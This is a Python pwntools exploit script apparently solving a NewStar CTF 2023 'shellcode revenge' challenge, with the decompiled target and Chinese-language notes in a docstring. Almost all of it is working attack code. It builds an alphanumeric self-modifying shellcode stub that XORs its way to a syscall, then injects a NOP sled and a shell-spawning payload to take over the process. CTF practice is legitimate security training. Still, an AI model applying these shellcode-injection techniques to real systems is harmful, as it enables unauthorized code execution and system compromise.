"""NewstaCTF2023 shellcode revenge 只用[a-zA-Z0-9]
  v5 = (int)mmap((void *)0x66660000, 0x1000uLL, 7, 50, -1, 0LL);
  puts("Welcome to NewStar CTF!!");
  puts("Show me your magic");
  for ( i = 0; ; ++i )
  {
    if ( i > 255 )
      goto LABEL_9;
    read(0, &buf, 1uLL);
    if ( buf > 'Z' || buf <= '/' || buf > '9' && buf <= '@' )
      break;
    src[i] = buf;
  }
  puts("Pls input the correct character");
LABEL_9:
  strncpy((char *)0x66660000, src, 0x100uLL);
  JUMPOUT(0x66660000LL);
  通过xor的操作对寄存器赋值，题目已经预先设置好read的寄存器，只需要执行出syscall就好，
  syscall的read不限制字符串输入，但是输入的地址是在rsi=0x66660000，
  目前执行的地址是有一定偏移的，加入一些nop滑板然后直接使用pwntools生成就好。可以参考b站imLZH1师傅的视频BV1Z14y1B7ji
"""
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# p = remote("node4.buuoj.cn",27904)
p = process('./shellcodere')
gdb.attach(p, 'b*0x000401373\nc')

payload = b'\x33\x42\x38'   # 33 42 38 xor eax, DWORD PTR [rdx+0x38] : eax=0 => eax=0x41414141
payload += b'\x31\x42\x30'  # 31 42 30 xor DWORD PTR [rdx+0x30], eax : eax ^ \x4e\x44\x4e\x44 = 0x0f    0x05    0x0f    0x05
payload += b'\x33\x42\x37'  # 33 42 38 xor eax, DWORD PTR [rdx+0x38] : eax = 0
payload += b'\x31\x42\x38'  # 31 42 38 xor DWORD PTR [rdx+0x38], eax : 无效果, 上面eax已经为0了
payload += b'\x59' * (0x30 - len(payload))  # 59 pop rcx : 一直pop到syscall前 , pop滑板
payload += b'\x4e\x44' * 2  # syscall  0x4e^0x41=0xf 0x44^0x41=0x5 , [rdx+0x30] = \x4e\x40\x4e\x40
payload += b'A' * 8  # xor key
p.sendlineafter("magic\n", payload)
pause()
p.sendline(b'\x90' * 0x50 + asm(shellcraft.sh()))
p.interactive()
